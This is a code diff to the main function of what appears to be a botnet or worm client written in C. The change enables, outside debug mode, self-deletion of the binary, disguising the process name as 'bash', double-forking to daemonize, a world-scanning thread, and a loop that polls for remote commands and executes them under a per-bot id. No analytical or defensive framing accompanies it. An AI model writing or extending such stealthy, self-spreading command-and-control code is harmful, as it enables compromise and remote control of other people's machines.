@@ -53,42 +53,49 @@ int main(int argc, char *argv[])
 	pid_t pid2;
 	int status;
 
-	remove(argv[0]);
-	/*srand(time(NULL) ^ getpid());
-	strncpy(argv[0], "bash", strlen(argv[0]));
-	argv[0] = "bash";
-	prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
-
-	// fork avant setsid()
-	if (pid1 = fork())
+	if (!DEBUG)
 	{
-		waitpid(pid1, &status, 0);
-		exit(0);
-	}
-	else if (!pid1)
-	{
-		if (pid2 = fork())
+		remove(argv[0]);
+		srand(time(NULL) ^ getpid());
+		strncpy(argv[0], "bash", strlen(argv[0]));
+		argv[0] = "bash";
+		prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
+	
+		// fork avant setsid()
+		if (pid1 = fork())
 		{
+			waitpid(pid1, &status, 0);
 			exit(0);
 		}
-		else if (!pid2)
+		else if (!pid1)
 		{
+			if (pid2 = fork())
+			{
+				exit(0);
+			}
+			else if (!pid2)
+			{
+			}
+			else
+			{
+				// zprintf("fork failed\n");
+			}
 		}
 		else
 		{
 			// zprintf("fork failed\n");
 		}
+		setsid();
+		chdir("/");
+		signal(SIGPIPE, SIG_IGN);
 	}
-	else
-	{
-		// zprintf("fork failed\n");
-	}
-	setsid();
-	chdir("/");
-	signal(SIGPIPE, SIG_IGN);*/
 	addr = inet_addr("8.8.8.8");
 	arch = ft_getarch();
 	id = ft_get_id();
+	char *uwu;
+	uwu = ft_itoa(rand() % 100000);
+	id = ft_strnjoin(id, "-", 1);
+	id = ft_strnjoin(id, uwu, strlen(uwu));
 	if (pthread_create(&ip_searcher, NULL, (void *)&ft_scan_world, NULL))
 		pthread_join(ip_searcher, NULL);
 	while (true)
@@ -99,7 +106,10 @@ int main(int argc, char *argv[])
 		request = ft_strnjoin(request, arch, strlen(request));
 		tmp = ft_request(request);
 		if (tmp)
+		{
 			ft_manage_request(tmp);
+			free(tmp);
+		}
 		free(request);
 		if (DEBUG)
 			usleep(250000);
